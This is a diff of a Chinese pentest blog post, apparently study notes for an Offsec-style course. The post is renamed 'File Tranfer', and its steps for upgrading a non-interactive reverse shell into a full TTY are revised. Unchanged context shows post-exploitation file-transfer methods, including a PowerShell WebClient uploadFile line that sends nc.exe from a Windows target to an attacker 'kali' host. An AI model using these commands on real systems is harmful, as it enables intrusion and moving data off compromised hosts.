@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="后渗透阶段需要往目标主机上上传文件或者需要目标主机从外部下载文件 非交互式shell的升级12345678910攻击主机上依次执行python -c &quot;import pty; pty.spawn(&#x27;&#x2F;bin&#x2F;bash&#x27;)&quot;然后ctrl+Z将进程放置到后台运行stty raw -echo运行fg将后台的进程拉起export SHELL&#x3D;&#x2F;bin&#x2F;bashexp">
+    <meta name="description" content="非交互式shell的升级最新版kali使用的是zsh不是bash，所以之前的应该使用如下方法 123456789#in kalipython -c &quot;import pty; pty.spawn(&#x27;&#x2F;bin&#x2F;bash&#x27;)&quot;然后ctrl+Z将进程放置到后台运行stty raw -echo; fgenterexport SHELL&#x3D;&#x2F;bin&#x2F;bashexport">
 <meta property="og:type" content="article">
-<meta property="og:title" content="File Uploading And Downloading">
-<meta property="og:url" content="http://example.com/2024/04/08/FileUploadAndDownload/index.html">
+<meta property="og:title" content="File Tranfer">
+<meta property="og:url" content="http://example.com/2024/06/05/File-Tranfer/index.html">
 <meta property="og:site_name" content="B00ze Escape">
-<meta property="og:description" content="后渗透阶段需要往目标主机上上传文件或者需要目标主机从外部下载文件 非交互式shell的升级12345678910攻击主机上依次执行python -c &quot;import pty; pty.spawn(&#x27;&#x2F;bin&#x2F;bash&#x27;)&quot;然后ctrl+Z将进程放置到后台运行stty raw -echo运行fg将后台的进程拉起export SHELL&#x3D;&#x2F;bin&#x2F;bashexp">
+<meta property="og:description" content="非交互式shell的升级最新版kali使用的是zsh不是bash，所以之前的应该使用如下方法 123456789#in kalipython -c &quot;import pty; pty.spawn(&#x27;&#x2F;bin&#x2F;bash&#x27;)&quot;然后ctrl+Z将进程放置到后台运行stty raw -echo; fgenterexport SHELL&#x3D;&#x2F;bin&#x2F;bashexport">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-04-08T09:14:20.000Z">
-<meta property="article:modified_time" content="2024-04-08T09:22:48.802Z">
+<meta property="article:published_time" content="2024-06-05T06:36:56.000Z">
+<meta property="article:modified_time" content="2024-06-05T06:44:55.167Z">
 <meta property="article:author" content="yu1e">
 <meta property="article:tag" content="Pentest">
 <meta name="twitter:card" content="summary">
@@ -37,7 +37,7 @@
       
     
     <!-- title -->
-    <title>File Uploading And Downloading</title>
+    <title>File Tranfer</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
@@ -86,10 +86,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="上一篇" href="/2024/04/08/AttackingClient/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="上一篇" href="/2024/06/05/AD-Lateral-Movement/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="下一篇" href="/2024/04/08/WindowsPrivilegeEscalation/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="下一篇" href="/2024/06/05/git%E5%91%BD%E4%BB%A4github%E6%8A%A5%E9%94%9922%E7%AB%AF%E5%8F%A3%E6%8B%92%E7%BB%9D%E8%AE%BF%E9%97%AE%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -102,17 +102,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/08/FileUploadAndDownload/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/08/FileUploadAndDownload/&text=File Uploading And Downloading"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/08/FileUploadAndDownload/&is_video=false&description=File Uploading And Downloading"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=File Uploading And Downloading&body=Check out this article: http://example.com/2024/04/08/FileUploadAndDownload/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/08/FileUploadAndDownload/&name=File Uploading And Downloading&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/08/FileUploadAndDownload/&t=File Uploading And Downloading"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/File-Tranfer/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/File-Tranfer/&text=File Tranfer"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/File-Tranfer/&is_video=false&description=File Tranfer"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=File Tranfer&body=Check out this article: http://example.com/2024/06/05/File-Tranfer/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/File-Tranfer/&name=File Tranfer&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/File-Tranfer/&t=File Tranfer"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -132,7 +132,7 @@
   <header>
     
     <h1 class="posttitle p-name" itemprop="name headline">
-        File Uploading And Downloading
+        File Tranfer
     </h1>
 
 
@@ -144,7 +144,7 @@
       
     <div class="postdate">
       
-        <time datetime="2024-04-08T09:14:20.000Z" class="dt-published" itemprop="datePublished">2024-04-08</time>
+        <time datetime="2024-06-05T06:36:56.000Z" class="dt-published" itemprop="datePublished">2024-06-05</time>
         
       
     </div>
@@ -164,8 +164,8 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <p>后渗透阶段需要往目标主机上上传文件或者需要目标主机从外部下载文件</p>
-<h2 id="非交互式shell的升级"><a href="#非交互式shell的升级" class="headerlink" title="非交互式shell的升级"></a>非交互式shell的升级</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">攻击主机上依次执行</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">然后ctrl+Z将进程放置到后台运行</span><br><span class="line">stty raw -echo</span><br><span class="line">运行fg将后台的进程拉起</span><br><span class="line">export SHELL=/<span class="built_in">bin</span>/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows <span class="number">40</span> columns <span class="number">120</span></span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+    <h2 id="非交互式shell的升级"><a href="#非交互式shell的升级" class="headerlink" title="非交互式shell的升级"></a>非交互式shell的升级</h2><p>最新版kali使用的是zsh不是bash，所以之前的应该使用如下方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#in kali</span><br><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">然后ctrl+Z将进程放置到后台运行</span><br><span class="line">stty raw -echo; fg</span><br><span class="line">enter</span><br><span class="line">export SHELL=/bin/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows 40 columns 120</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
 
 <h2 id="Linux系统文件传输"><a href="#Linux系统文件传输" class="headerlink" title="Linux系统文件传输"></a>Linux系统文件传输</h2><p>nc、wget、curl等，相对容易</p>
 <h2 id="win系统传文件"><a href="#win系统传文件" class="headerlink" title="win系统传文件"></a>win系统传文件</h2><h3 id="使用原生FTP命令进行下载"><a href="#使用原生FTP命令进行下载" class="headerlink" title="使用原生FTP命令进行下载"></a>使用原生FTP命令进行下载</h3><p>Windows系统默认包含FTP客户端程序(交互式程序)，-s参数可指定包含FTP指令的源文件实现非交互式传文件</p>
@@ -212,7 +212,6 @@
 <p>从 Windows主机上传文件到Kali </p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell (New-Object</span><br><span class="line">System.Net.WebClient).uploadFile(&#x27;http://kali/upload.php&#x27;, &#x27;nc.exe&#x27;)</span><br></pre></td></tr></table></figure>
 
-
   </div>
 </article>
 
@@ -249,17 +248,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/08/FileUploadAndDownload/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/08/FileUploadAndDownload/&text=File Uploading And Downloading"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/08/FileUploadAndDownload/&is_video=false&description=File Uploading And Downloading"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=File Uploading And Downloading&body=Check out this article: http://example.com/2024/04/08/FileUploadAndDownload/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/08/FileUploadAndDownload/&name=File Uploading And Downloading&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/08/FileUploadAndDownload/&t=File Uploading And Downloading"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/File-Tranfer/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/File-Tranfer/&text=File Tranfer"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/File-Tranfer/&is_video=false&description=File Tranfer"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=File Tranfer&body=Check out this article: http://example.com/2024/06/05/File-Tranfer/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/File-Tranfer/&title=File Tranfer"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/File-Tranfer/&name=File Tranfer&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/File-Tranfer/&t=File Tranfer"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
